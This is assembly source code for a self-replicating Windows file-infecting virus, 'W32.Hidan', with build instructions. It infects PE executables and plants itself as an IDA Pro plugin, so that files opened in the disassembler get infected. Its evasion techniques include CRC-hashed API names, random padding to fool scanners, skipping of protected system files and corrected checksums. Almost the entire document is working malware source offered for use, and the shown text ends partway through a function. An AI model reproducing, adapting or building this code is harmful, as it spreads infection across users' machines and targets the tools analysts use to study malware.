comment ;)
W32.Hidan by roy g biv

some of its features:
- parasitic resident (own process) infector of PE exe (but not looking at suffix)
- infects files when IDA loads them
- reloc section inserter/last section appender
- uses CRCs instead of API names
- uses SEH for common code exit
- section attributes are never altered (virus is not self-modifying)
- no infect files with data outside of image (eg self-extractors)
- infected files are padded by random amounts to confuse tail scanners
- uses SEH walker to find kernel address (no hard-coded addresses)
- correct file checksum without using imagehlp.dll :) 100% correct algorithm

yes, just a W32.OU812 remake that infects in a slightly different way
---

  optimisation tip: Windows appends ".dll" automatically, so this works:
        push "cfs"
        push esp
        call LoadLibraryA
---

to build this thing:
tasm
----
tasm32 /ml /m3 hidan
link hidan /subsystem:windows /entry:dropper kernel32.lib user32.lib ida.lib

Virus is not self-modifying, so no need to alter section attributes
---

We're in the middle of a phase transition:
a butterfly flapping its wings at
just the right moment could
cause a storm to happen.
-I'm trying to understand-
I'm at a moment in my life-
I don't know where to flap my wings.
(Danny Hillis)

(;

.386
.model  flat

extern  _GetModuleHandleA@4:proc
extern  _MessageBoxA@16:proc
extern  _ExitProcess@4:proc
extern  _RootNode:dword
extern  _netnode_value@4:proc

.data
include hidan.inc

_dropper        label   near
public _dropper
        push    0
        call    _GetModuleHandleA@4
        mov     ebx, eax
        push    40h
        pop     ecx
        add     eax, dword ptr [ebx + ecx + mzhdr.mzlfanew - 40h]
        mov     ecx, dword ptr [ecx * 2 + eax]  ;import table rva

find_ida        label   near
        mov     esi, dword ptr [ebx + ecx + peimp.impdllrva]
        add     ecx, size peimp
        add     esi, ebx
        lods    dword ptr [esi]
        or      eax, "    "
        sub     eax, ".adi"
        jne     find_ida
        add     ebx, dword ptr [ebx + ecx + peimp.impilt - size peimp]
        imul    ax, word ptr [ebx], 4
        sub     eax, 4
        mov     dword ptr [offset ordinal2 + 3], eax
        imul    ax, word ptr [ebx + 4], 4
        sub     eax, 4
        mov     dword ptr [offset ordinal1 + 3], eax
        mov     edx, krncrc_count
        mov     ebx, offset krnnames
        mov     edi, offset krncrcbegin
        call    create_crcs
        mov     edx, 1
        mov     ebx, offset sfcnames
        mov     edi, offset sfccrcbegin
        call    create_crcs
        mov     edx, dllcrc_count
        mov     ebx, offset dllnames
        mov     edi, offset dllcrcbegin
        call    create_crcs
        mov     edx, 1
        mov     ebx, offset regnames
        mov     edi, offset regcrcbegin
        call    create_crcs
        jmp     hidan_execode
;-----------------------------------------------------------------------------
;everything before this point is dropper code
;-----------------------------------------------------------------------------

;-----------------------------------------------------------------------------
;virus code begins here
;-----------------------------------------------------------------------------

hidan_dllcode   proc    near
        pushad
        call    hidan_kernel
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     ecx
        popad
        ret

hidan_exp       PLUGIN <IDP_INTERFACE_VERSION, 0, dllsize + 1000h>

;-----------------------------------------------------------------------------
;main virus body.  everything happens in here
;-----------------------------------------------------------------------------

hidan_kernel    proc    near
        push    dword ptr fs:[eax]
        mov     dword ptr fs:[eax], esp
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

krncrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (krncrc_count + 1) dup (0)
krncrcend       label   near
        dd      offset check_sfc - offset krncrcend + 4
        db      "hIDAn - roy g biv"             ;I'm waiting for you...

init_findmz     label   near
        xor     esi, esi
        lods    dword ptr fs:[esi]
        inc     eax

walk_seh        label   near
        dec     eax
        xchg    esi, eax
        lods    dword ptr [esi]
        inc     eax
        jne     walk_seh
        mov     edi, dword ptr [esi]

find_mzhdr      label   near

;-----------------------------------------------------------------------------
;do not use hard-coded kernel address values because it is not portable
;Microsoft used all different values for 95, 98, NT, 2000, Me, XP
;they will maybe change again for every new release
;-----------------------------------------------------------------------------

        dec     edi                             ;sub 64kb
        xor     di, di                          ;64kb align
        call    is_pehdr
        jne     find_mzhdr
        mov     ebx, edi
        pop     edi

;-----------------------------------------------------------------------------
;parse export table
;-----------------------------------------------------------------------------

        mov     esi, dword ptr [esi + pehdr.peexport.dirrva - pehdr.pecoff]
        lea     esi, dword ptr [ebx + esi + peexp.expadrrva]
        lods    dword ptr [esi]                 ;Export Address Table RVA
        lea     edx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Name Pointer Table RVA
        lea     ecx, dword ptr [ebx + eax]
        lods    dword ptr [esi]                 ;Ordinal Table RVA
        lea     ebp, dword ptr [ebx + eax]
        mov     esi, ecx

push_export     label   near
        push    ecx

get_export      label   near
        lods    dword ptr [esi]
        push    ebx
        add     ebx, eax                        ;Name Pointer VA
        or      eax, -1

crc_outer       label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

crc_inner       label   near
        add     eax, eax
        jnb     crc_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

crc_skip        label   near
        loop    crc_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      crc_outer
        pop     ebx
        cmp     dword ptr [edi], eax
        jne     get_export

;-----------------------------------------------------------------------------
;exports must be sorted alphabetically, otherwise GetProcAddress() would fail
;this allows to push addresses onto the stack, and the order is known
;-----------------------------------------------------------------------------

        pop     ecx
        mov     eax, esi
        sub     eax, ecx                        ;Name Pointer Table VA
        shr     eax, 1
        movzx   eax, word ptr [ebp + eax - 2]   ;get export ordinal
        mov     eax, dword ptr [eax * 4 + edx]  ;get export RVA
        add     eax, ebx
        push    eax
        scas    dword ptr [edi]
        cmp     dword ptr [edi], 0
        jne     push_export
        add     edi, dword ptr [edi + 4]
        jmp     edi

;-----------------------------------------------------------------------------
;get SFC support if available
;-----------------------------------------------------------------------------

check_sfc       label   near
        call    load_sfc
        db      "sfc_os", 0                     ;Windows XP (forwarder chain from sfc.dll)

load_sfc        label   near
        call    dword ptr [esp + krncrcstk.kLoadLibraryA]
        test    eax, eax
        jne     found_sfc
        push    'cfs'                           ;Windows Me/2000
        push    esp
        call    dword ptr [esp + 4 + krncrcstk.kLoadLibraryA]
        pop     ecx
        test    eax, eax
        je      sfcapi_push

found_sfc       label   near
        inc     eax
        xchg    edi, eax
        call    find_mzhdr

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

sfccrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      0, 0
sfccrcend       label   near
        dd      offset sfcapi_pop - offset sfccrcend + 4

sfcapi_pop      label   near
        pop     eax

sfcapi_push     label   near
        push    eax
        mov     ebp, esp
        push    "llw"
        push    ".adi"
        push    esp
        call    dword ptr [ebp + krncrcstk.kLoadLibraryA]
        pop     ecx
        pop     ecx
        mov     edx, dword ptr [eax + mzhdr.mzlfanew]
        mov     ecx, dword ptr [edx + eax + pehdr.peexport]
        mov     edx, dword ptr [ecx + eax + peexp.expadrrva]

ordinal1        label   near
        mov     ecx, dword ptr [edx + eax + '!bgr']  ;RootNode
        push    dword ptr [ecx + eax]                ;this

ordinal2        label   near
        add     eax, dword ptr [edx + eax + '!bgr']  ;_netnode_value@4
        call    eax
        xchg    edi, eax

;-----------------------------------------------------------------------------
;convert path to Unicode (SFC requires Unicode path)
;-----------------------------------------------------------------------------

        push    edi
        call    dword ptr [ebp + krncrcstk.kGetFileAttributesA]
        push    eax                             ;save original file attributes for close
        enter   MAX_PATH * 2, 0
        mov     eax, esp
        xor     ebx, ebx
        push    MAX_PATH
        push    eax
        push    -1
        push    edi
        push    ebx                             ;use default translation
        push    ebx                             ;CP_ANSI
        call    dword ptr [ebp + 8 + krncrcstk.kMultiByteToWideChar]

;-----------------------------------------------------------------------------
;don't touch protected files
;-----------------------------------------------------------------------------

        mov     ecx, dword ptr [ebp + 8 + krncrcstk.kSfcIsFileProtected]
        xor     eax, eax                        ;fake success in case of no SFC
        jecxz   leave_sfc
        push    esp
        push    ebx
        call    ecx

leave_sfc       label   near
        leave
        test    eax, eax
        jne     restore_attr
        call    set_fileattr
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    FILE_SHARE_READ or FILE_SHARE_WRITE
                                                ;IDA opens with full sharing, so we must do the same
        push    GENERIC_READ or GENERIC_WRITE
        push    edi
        call    dword ptr [ebp + krncrcstk.kCreateFileA]
        push    ebx
        push    eax
        xchg    ebx, eax
        call    dword ptr [ebp + krncrcstk.kGetFileSize]
        xchg    esi, eax
        push    edi
        xor     eax, eax
        call    test_infect
        db      81h                             ;mask CALL
        call    infect_file                     ;Super Nashwan power ;)
        push    eax
        push    eax
        mov     esi, esp
        push    eax
        push    eax
        push    esp
        push    eax
        push    0
        push    ebx
        call    dword ptr [ebp + krncrcstk.kGetFileTime]
        push    esp
        push    esi
        push    0
        push    ebx
        call    dword ptr [ebp + krncrcstk.kSetFileTime]
        add     esp, 10h
        push    ebx
        call    dword ptr [ebp + krncrcstk.kCloseHandle]
        pop     edi

restore_attr    label   near
        pop     ebx                             ;restore original file attributes
        push    0                               ;game over

;-----------------------------------------------------------------------------
;reset/set read-only file attribute
;-----------------------------------------------------------------------------

set_fileattr    proc    near                    ;ebx = file attributes, edi -> filename, ebp -> platform APIs
        push    ebx
        push    edi
        call    dword ptr [ebp + krncrcstk.kSetFileAttributesA]
        ret                                     ;edi -> filename
        db      "05/09/05"
set_fileattr    endp

;-----------------------------------------------------------------------------
;look for MZ and PE file signatures
;-----------------------------------------------------------------------------

is_pehdr        proc    near                    ;edi -> map view
        cmp     word ptr [edi], 'ZM'            ;Windows does not check 'MZ'
        jne     pehdr_ret
        mov     esi, dword ptr [edi + mzhdr.mzlfanew]
        add     esi, edi
        lods    dword ptr [esi]                 ;SEH protects against bad lfanew value
        add     eax, -'EP'                      ;anti-heuristic test filetype ;) and clear EAX

pehdr_ret       label   near
        ret                                     ;if PE file, then eax = 0, esi -> COFF header, Z flag set
is_pehdr        endp

;-----------------------------------------------------------------------------
;test if file is infectable (not protected, PE, x86, non-system, not infected, etc)
;-----------------------------------------------------------------------------

test_infect     proc    near                    ;esi = filesize, edi = map view
        call    map_view
        mov     ebp, esi
        call    is_pehdr
        jne     inftest_ret
        lods    dword ptr [esi]
        cmp     ax, IMAGE_FILE_MACHINE_I386
        jne     inftest_ret                     ;only Intel 386+
        shr     eax, 0dh                        ;move high 16 bits into low 16 bits and multiply by 8
        lea     edx, dword ptr [eax * 4 + eax]  ;complete multiply by 28h (size pesect)
        mov     ecx, dword ptr [esi + pehdr.pecoff.peflags - pehdr.pecoff.petimedate]

;-----------------------------------------------------------------------------
;IMAGE_FILE_BYTES_REVERSED_* bits are rarely set correctly, so do not test them
;no .dll files this time
;-----------------------------------------------------------------------------

        test    ch, (IMAGE_FILE_SYSTEM or IMAGE_FILE_DLL or IMAGE_FILE_UP_SYSTEM_ONLY) shr 8
        jne     inftest_ret
        add     esi, pehdr.peentrypoint - pehdr.pecoff.petimedate
        lods    dword ptr [esi]
        xchg    ecx, eax

;-----------------------------------------------------------------------------
;32-bit executable file...
;-----------------------------------------------------------------------------

        and     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        cmp     ax, IMAGE_FILE_EXECUTABLE_IMAGE or IMAGE_FILE_32BIT_MACHINE
        jne     inftest_ret                     ;cannot use xor+jpo because 0 is also jpe

;-----------------------------------------------------------------------------
;the COFF magic value is not checked because Windows ignores it anyway
;IMAGE_FILE_MACHINE_IA64 machine type is the only reliable way to detect PE32+
;-----------------------------------------------------------------------------

        mov     eax, dword ptr [esi + pehdr.pesubsys - pehdr.pecodebase]
        cmp     ax, IMAGE_SUBSYSTEM_WINDOWS_CUI
        jnbe    inftest_ret
        cmp     al, IMAGE_SUBSYSTEM_WINDOWS_GUI ;al not ax, because ah is known now to be 0
        jb      inftest_ret
        shr     eax, 1eh                        ;test eax, IMAGE_DLLCHARACTERISTICS_WDM_DRIVER shl 10h
        jb      inftest_ret

;-----------------------------------------------------------------------------
;avoid files which seem to contain attribute certificates
;because one of those certificates might be a digital signature
;-----------------------------------------------------------------------------

        cmp     dword ptr [esi + pehdr.pesecurity.dirrva - pehdr.pecodebase], eax
        jnbe    inftest_ret

;-----------------------------------------------------------------------------
;cannot use the NumberOfRvaAndSizes field to calculate the Optional Header size
;the Optional Header can be larger than the offset of the last directory
;remember: even if you have not seen it does not mean that it does not happen :)
;-----------------------------------------------------------------------------

        movzx   eax, word ptr [esi + pehdr.pecoff.peopthdrsize - pehdr.pecodebase]
        add     eax, edx
        mov     ebx, dword ptr [esi + pehdr.pefilealign - pehdr.pecodebase]
        mov     edx, dword ptr [esi + pehdr.peimagebase - pehdr.pecodebase]
        lea     esi, dword ptr [esi + eax - pehdr.pecodebase + pehdr.pemagic - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        add     eax, dword ptr [esi]
        cmp     ebp, eax
        jne     inftest_ret                     ;file contains appended data
        add     dword ptr [esp + mapsehstk.mapsehregesi], ebx
        inc     dword ptr [esp + mapsehstk.mapsehinfret]
                                                ;skip call mask

inftest_ret     label   near
        int     3

;-----------------------------------------------------------------------------
;increase file size by random value (between RANDPADMIN and RANDPADMAX bytes)
;I use GetTickCount() instead of RDTSC because RDTSC can be made privileged
;-----------------------------------------------------------------------------

open_append     proc    near
        call    dword ptr [ebp + krncrcstk.kGetTickCount]
        and     eax, RANDPADMAX - 1
        add     ax, small (offset hidan_codeend - offset hidan_dllcode + RANDPADMIN)

;-----------------------------------------------------------------------------
;create file map, and map view if successful
;-----------------------------------------------------------------------------

map_view        proc    near                    ;eax = extra bytes to map, ebx = file handle, esi = filesize, ebp -> platform APIs
        cdq
        add     eax, esi
        push    eax
        mov     ecx, esp
        push    eax                             ;MapViewOfFile
        push    edx                             ;MapViewOfFile
        push    edx                             ;MapViewOfFile
        push    FILE_MAP_WRITE                  ;Windows 9x/Me does not support FILE_MAP_ALL_ACCESS
        push    edx
        push    eax
        push    edx
        push    PAGE_READWRITE
        push    edx
        push    ebx
        call    dword ptr [ebp + krncrcstk.kCreateFileMappingA]
        push    eax
        xchg    edi, eax
        call    dword ptr [ebp + krncrcstk.kMapViewOfFile]
        pop     ecx
        xchg    edi, eax                        ;should succeed even if file cannot be opened
        pushad
        call    unmap_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad                                   ;SEH destroys all registers
        push    eax
        push    edi
        call    dword ptr [ebp + krncrcstk.kUnmapViewOfFile]
        call    dword ptr [ebp + krncrcstk.kCloseHandle]
        pop     eax
        ret

unmap_seh       proc    near
        cdq
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        jmp     dword ptr [esp + mapsehstk.mapsehsehret]
unmap_seh       endp
map_view        endp                            ;eax = map handle, ecx = new file size, edi = map view
open_append     endp

;-----------------------------------------------------------------------------
;infect file in two parts
;algorithm:     increase file size by random amount (RANDPADMIN-RANDPADMAX
;               bytes) to confuse scanners that look at end of file (also
;               infection marker)
;               if reloc table is not in last section (taken from relocation
;               field in PE header, not section name), then append to last
;               section.  otherwise, move relocs down and insert code into
;               space (to confuse people looking at end of file.  they will
;               see only relocation data and garbage or many zeroes)
;               entry point is altered to point to some code.  very simple
;               however, that code just drops dll and returns
;               other alteration is to store language dll name in VB header
;               dll contains virus code and is loaded by Visual Basic
;-----------------------------------------------------------------------------

infect_file     label   near                    ;esi -> findlist, edi = map view
        call    open_append

delta_label     label   near
        push    ecx
        push    edi
        mov     ebx, dword ptr [edi + mzhdr.mzlfanew]
        lea     ebx, dword ptr [ebx + edi + pehdr.pechksum]
        xor     ecx, ecx
        imul    cx, word ptr [ebx + pehdr.pecoff.pesectcount - pehdr.pechksum], size pesect
        add     cx, word ptr [ebx + pehdr.pecoff.peopthdrsize - pehdr.pechksum]
        lea     esi, dword ptr [ebx + ecx + pehdr.pemagic - pehdr.pechksum - size pesect + pesect.sectrawsize]
        lods    dword ptr [esi]
        mov     cx, offset hidan_codeend - offset hidan_dllcode
        mov     edx, dword ptr [ebx + pehdr.pefilealign - pehdr.pechksum]
        push    eax
        add     eax, ecx
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx                        ;file align last section
        mov     dword ptr [esi + pesect.sectrawsize - pesect.sectrawaddr], eax

;-----------------------------------------------------------------------------
;raw size is file aligned.  virtual size is not required to be section aligned
;so if old virtual size is larger than new raw size, then size of image does
;not need to be updated, else virtual size must be large enough to cover the
;new code, and size of image is section aligned
;-----------------------------------------------------------------------------

        mov     ebp, dword ptr [esi + pesect.sectvirtaddr - pesect.sectrawaddr]
        cmp     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        jnb     test_reloff
        mov     dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr], eax
        add     eax, ebp
        mov     edx, dword ptr [ebx + pehdr.pesectalign - pehdr.pechksum]
        dec     edx
        add     eax, edx
        not     edx
        and     eax, edx
        mov     dword ptr [ebx + pehdr.peimagesize - pehdr.pechksum], eax

;-----------------------------------------------------------------------------
;if relocation table is not in last section, then append to last section
;otherwise, move relocations down and insert code into space
;-----------------------------------------------------------------------------

test_reloff     label   near
        test    byte ptr [ebx + pehdr.pecoff.peflags - pehdr.pechksum], IMAGE_FILE_RELOCS_STRIPPED
        jne     copy_code
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ebp
        jb      copy_code
        mov     eax, dword ptr [esi + pesect.sectvirtsize - pesect.sectrawaddr]
        add     eax, ebp
        cmp     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], eax
        jnb     copy_code
        add     dword ptr [ebx + pehdr.pereloc.dirrva - pehdr.pechksum], ecx
        pop     eax
        push    esi
        add     edi, dword ptr [esi]
        lea     esi, dword ptr [edi + eax - 1]
        lea     edi, dword ptr [esi + ecx]
        xchg    ecx, eax
        std
        rep     movs byte ptr [edi], byte ptr [esi]
        cld
        pop     esi
        pop     edi
        push    edi
        push    ecx
        xchg    ecx, eax

copy_code       label   near
        pop     edx
        add     ebp, edx
        xchg    ebp, eax
        add     edx, dword ptr [esi]
        add     edi, edx
        push    esi
        mov     esi, offset hidan_dllcode - offset delta_label
        add     esi, dword ptr [esp + infectstk.infseh.mapsehsehret]
                                                ;delta offset
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     esi

;-----------------------------------------------------------------------------
;alter entry point
;-----------------------------------------------------------------------------

if ((offset hidan_codeend - offset dlllabel) and not 0ffh)
        .err    "dropper is too large"
endif
        mov     cl, small (offset hidan_codeend - offset dlllabel)
        sub     edi, ecx
        add     eax, offset hidan_execode - offset hidan_dllcode
        xchg    dword ptr [ebx + pehdr.peentrypoint - pehdr.pechksum], eax
        mov     edx, dword ptr [ebx + pehdr.peimagebase - pehdr.pechksum]
        add     eax, edx
        xor     ecx, ecx
        mov     word ptr [edi + offset hidan_exp - offset dlllabel + PLUGIN.init + 2], cx
        mov     dword ptr [edi + offset host_patch - offset dlllabel + 1], eax
        pop     edi

;-----------------------------------------------------------------------------
;CheckSumMappedFile() - simply sum of all words in file, then adc filesize
;-----------------------------------------------------------------------------

        xchg    dword ptr [ebx], ecx
        jecxz   infect_ret
        cdq
        pop     ecx
        push    ecx
        inc     ecx
        shr     ecx, 1
        clc

calc_checksum   label   near
        adc     dx, word ptr [edi]
        inc     edi
        inc     edi
        loop    calc_checksum
        pop     dword ptr [ebx]
        adc     dword ptr [ebx], edx            ;avoid common bug.  ADC not ADD

infect_ret      label   near
        int     3                               ;common exit using SEH
        db      "*4U2NV*"                       ;that is, unless you're reading this
test_infect     endp

hidan_execode   proc    near
host_patch      label   near
        push    offset do_message               ;replaced dynamically
        pushad
        call    init_findmz

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

dllcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      (dllcrc_count + 1) dup (0)
dllcrcend       label   near
        dd      offset load_reg - offset dllcrcend + 4

advapi32        label   near
        db      "advapi32", 0

load_reg        label   near
        lea     eax, dword ptr [edi + offset advapi32 - offset load_reg]
        push    eax
        call    dword ptr [esp + dllcrcstk.dLoadLibraryA + 4]
        inc     eax
        xchg    edi, eax
        call    find_mzhdr

;-----------------------------------------------------------------------------
;API CRC table, null terminated
;-----------------------------------------------------------------------------

regcrcbegin     label   near                    ;place < 80h bytes from call for smaller code
        dd      0, 0
regcrcend       label   near
        dd      offset reg_query - offset regcrcend + 4

dotidb  db      ".idb", 0
shellop db      "\shell\open\command", 0

reg_query       label   near
        pop     eax
        mov     ebx, esp
        enter   MAX_PATH, 0
        xchg    ebp, eax
        mov     esi, esp
        sub     edi, offset reg_query - offset dotidb
        push    7fh
        push    esp
        push    esi
        push    edi
        push    80000000h
        call    ebp
        test    eax, eax
        jne     fail_idp
        lea     eax, dword ptr [edi + offset shellop - offset dotidb]
        push    eax
        push    esi
        call    dword ptr [ebx + dllcrcstk.dlstrcatA]
        pop     eax
        push    7fh
        push    esp
        push    esi
        push    esi
        push    80000000h
        call    ebp
        inc     esi
        push    esi

find_slash      label   near
        cmp     al, '\'
        jne     find_quote
        mov     edi, esi

find_quote      label   near
        lods    byte ptr [esi]
        cmp     al, '"'
        jne     find_slash
        mov     eax, "gulp"
        stos    dword ptr [edi]
        mov     eax, "sni"
        stos    dword ptr [edi]
        call    skip_dll

dlllabel        label   near
        db      '\', dllname, ".plw"
        db      0ch - (offset $ - offset dlllabel) dup (0)

dllsize equ     0bch
;RLE-based compressed MZ header, PE header, section table, relocation table
        dd      10101001100001001001011000010111b
        ;       1r   04mmz   02r   02mmz   02mmm
        db      'M', 'Z', (offset hidan_exp - offset hidan_dllcode + dllsize) and 0ffh, (offset hidan_exp - offset hidan_dllcode + dllsize + 1000h) shr 8, 'P', 'E', 4ch, 1, 1
        dd      00000101110010000011111011110100b
        ;       z   01r   0cmz   01mmmmr   0em
        db      70h, 2, 21h, 0bh, 1, 4eh
        dd      00001101010010010001000011100001b
        ;       z   03r   04mz   08mz   03mz   02
        db      0ch, 10h, 2
        dd      01001011111100001011101001000001b
        ;       r   02mmmmmmz   02mmmr   02z   02
        db      58h, 59h, 1, 89h, offset hidan_exp - offset hidan_dllcode + dllsize + PLUGIN.init, (offset hidan_exp - offset hidan_dllcode + dllsize + PLUGIN.init + 1000h) shr 8, 5ah, 0ffh, 0e0h
        dd      10000101000100011111100001110000b
        ;       mz   02mz   04r   0fmz   03m
        db      ((offset hidan_codeend - offset hidan_dllcode + dllsize + 1fffh) and not 0fffh) shr 8, dllsize, 1, 1
        dd      00011110000111001111001101100001b
        ;       z   07mz   03mz   0fz   0dmz   02
        db      6, 64h, 10h
        dd      11000010100001110000111001010100b
        ;       mmz   02mz   03mz   03mz   0am
        db      0, ((offset hidan_codeend - offset hidan_dllcode + dllsize + 1ffh) and not 1ffh) shr 8, 1, 0ach, 8, 0e0h
        dd      0
;decompressed data follow.  'X' bytes are set to random value every time
;       db      'M', 'Z'                ;00
;       db      X, X                    ;02    align 4
;       db      X, X                    ;04    useless filler
;hidan_expadr:
;       dd      offset hidan_exp        ;06    export address
;       db      X, X                    ;0a    useless filler
;       db      'P', 'E', 0, 0          ;0c 00 signature
;       dw      14ch                    ;10 04 machine
;       dw      1                       ;12 06 number of sections
;       db      X, X, X, X              ;14 08 date/time stamp
;       db      X, X, X, X              ;18 0c pointer to symbol table
;       db      X, X, X, X              ;1c 10 number of symbols
;       dw      70h                     ;20 14 size of optional header
;       dw      2102h                   ;22 16 characteristics
;       dw      10bh                    ;24 18 magic
;       db      X                       ;26 1a major linker
;       db      X                       ;27 1b minor linker
;       db      X, X, X, X              ;28 1c size of code
;       db      X, X, X, X              ;2c 20 size of init data
;       db      X, X, X, X              ;30 24 size of uninit data
;       dd      offset entrypoint       ;34 28 entry point
;       db      X, X, X, X              ;38 2c base of code
;       dd      0ch                     ;3c 30 base of data (overload for lfanew)
;       dd      0                       ;40 34 image base
;       dd      1000h                   ;44 38 section align
;       dd      200h                    ;48 3c file align
;       db      X, X                    ;4c 40 major os
;entrypoint:
;       db      58h, 59h                ;4e 42 minor os (overload for pop eax, pop ecx)
;       db      1, 89h                  ;50 44 major image (overload for add dword ptr [ecx + 0000xxxx], ecx)
;       dw      offset hidan_exp - offset hidan_dllcode + dllsize + PLUGIN.init + 1000h
;                                       ;52 46 minor image
;       dw      0                       ;54 48 major subsys
;       db      5ah, 0ffh               ;56 4a minor subsys (overload for pop edx, half of jmp eax)
;       db      0e0h, X, X, X           ;58 4c reserved (overload for half of jmp eax)
;       dd      (aligned size of code)  ;5c 50 size of image
;       dd      dllsize                 ;60 54 size of headers
;hidan_exptbl:
;       dd      X, X, X, X              ;64 58 checksum (overload for flags)
;       db      X, X                    ;68 5c subsystem (overload for datetime)
;       db      X, X                    ;6a 5e dll characteristics (overload for datetime)
;       db      X, X, X, X              ;6c 60 size of stack reserve (overload for major and minor version)
;       db      X, X, X, X              ;70 64 size of stack commit (overload for dll rva)
;       dd      1                       ;74 68 size of heap reserve (overload for ordinal base)
;       dd      1                       ;78 6c size of heap commit (overload for address count)
;       dd      0                       ;7c 70 loader flags (overload for name count)
;       dd      6                       ;80 74 number of rva and sizes (overload for address rva)
;       dd      offset hidan_exptbl     ;84 78 export
;       dd      0                       ;88 7c export
;       dd      0                       ;8c 80 import
;       dd      0                       ;90 84 import
;       dd      0                       ;94 88 resource (overload for section name)
;       dd      0                       ;98 8c resource (overload for section name)
;       dd      0                       ;9c 90 exception (overload for virtual size)
;       dd      1000h                   ;a0 94 exception (overload for relative virtual address)
;       dd      (size of code)          ;a4 98 certificate (overload for file size)
;       dd      1                       ;a8 9c certificate (overload for file offset)
;       dd      0ach, 8                 ;ac a0 base reloc (overload for pointer to relocs)
;       dd      0                       ;b4 a8 debug (overload for reloc table and line numbers)
;       dd      0e0000000h              ;b8 ac debug (overload for section characteristics)
;                                       ;bc

skip_dll        label   near
        pop     esi
        push    offset hidan_codeend - offset hidan_dllcode + dllsize + 1ffh
        xor     ebp, ebp                        ;GMEM_FIXED
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dGlobalAlloc]
        pop     edx
        push    eax                             ;GlobalFree
        push    ebp                             ;WriteFile
        push    esp                             ;WriteFile
        push    offset hidan_codeend - offset hidan_dllcode + dllsize + 1ffh
                                                ;WriteFile
        push    eax                             ;WriteFile
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    CREATE_ALWAYS                   ;CreateFileA
        push    ebp                             ;CreateFileA
        push    ebp                             ;CreateFileA
        push    GENERIC_WRITE                   ;CreateFileA
        push    edx                             ;CreateFileA
        lea     ecx, dword ptr [eax + 7fh]
        push    ecx                             ;MoveFileA
        push    edx                             ;MoveFileA
        push    edx                             ;GetFileAttributesA
        push    ebp                             ;SetFileAttributesA
        push    edx                             ;SetFileAttributesA
        push    ecx                             ;DeleteFileA
        push    ecx                             ;GetTempFileNameA
        push    ebp                             ;GetTempFileNameA
        push    esp                             ;GetTempFileNameA
        push    edx                             ;GetTempFileNameA
        xchg    ebp, eax
        call    dword ptr [ebx + dllcrcstk.dGetTempFileNameA]
        call    dword ptr [ebx + dllcrcstk.dDeleteFileA]

;-----------------------------------------------------------------------------
;append dll name, assumes name is 0ch bytes long
;-----------------------------------------------------------------------------

        dec     edi
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]
        movs    dword ptr [edi], dword ptr [esi]

;-----------------------------------------------------------------------------
;anti-anti-file dropper - remove read-only attribute, delete file, rename directory
;-----------------------------------------------------------------------------

        call    dword ptr [ebx + dllcrcstk.dSetFileAttributesA]
        call    dword ptr [ebx + dllcrcstk.dGetFileAttributesA]
        test    al, FILE_ATTRIBUTE_DIRECTORY
        pop     ecx
        pop     eax
        je      skip_move
        push    eax
        push    ecx
        call    dword ptr [ebx + dllcrcstk.dMoveFileA]

skip_move       label   near
        call    dword ptr [ebx + dllcrcstk.dCreateFileA]
        push    ebx
        xchg    ebp, eax
        xchg    edi, eax
        call    dword ptr [ebx + dllcrcstk.dGetTickCount]
        xchg    ebx, eax
        xor     ecx, ecx

;-----------------------------------------------------------------------------
;decompress dll MZ header, PE header, section table, relocation table
;-----------------------------------------------------------------------------

        lods    dword ptr [esi]

copy_bytes      label   near
        movs    byte ptr [edi], byte ptr [esi]

test_bits       label   near
        add     eax, eax
        jb      copy_bytes
        add     eax, eax
        sbb     dl, dl
        and     dl, bl
        shld    ecx, eax, 4
        rol     ebx, cl
        shl     eax, 4
        xchg    edx, eax
        rep     stos byte ptr [edi]
        xchg    edx, eax
        jne     test_bits
        lods    dword ptr [esi]
        test    eax, eax
        jne     test_bits
        mov     cx, offset hidan_codeend - offset hidan_dllcode
        sub     esi, offset skip_dll - offset hidan_dllcode
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     ebx
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dWriteFile]
        push    ebp
        call    dword ptr [ebx + dllcrcstk.dCloseHandle]
        call    dword ptr [ebx + dllcrcstk.dGlobalFree]

fail_idp        label   near
        add     esp, size dllcrcstk + MAX_PATH + 8
        popad
        ret
hidan_execode   endp
hidan_codeend   label   near
hidan_kernel    endp
hidan_dllcode   endp

create_crcs     proc    near
        or      eax, -1

create_outer    label   near
        xor     al, byte ptr [ebx]
        push    8
        pop     ecx

create_inner    label   near
        add     eax, eax
        jnb     create_skip
        xor     eax, 4c11db7h                   ;use generator polymonial (see IEEE 802)

create_skip     label   near
        loop    create_inner
        sub     cl, byte ptr [ebx]              ;carry set if not zero
        inc     ebx                             ;carry not altered by inc
        jb      create_outer
        stos    dword ptr [edi]
        dec     edx
        jne     create_crcs
        ret
create_crcs     endp

do_message      label   near
        xor     ebx, ebx
        push    ebx
        push    offset txttitle
        push    offset txtbody
        push    ebx
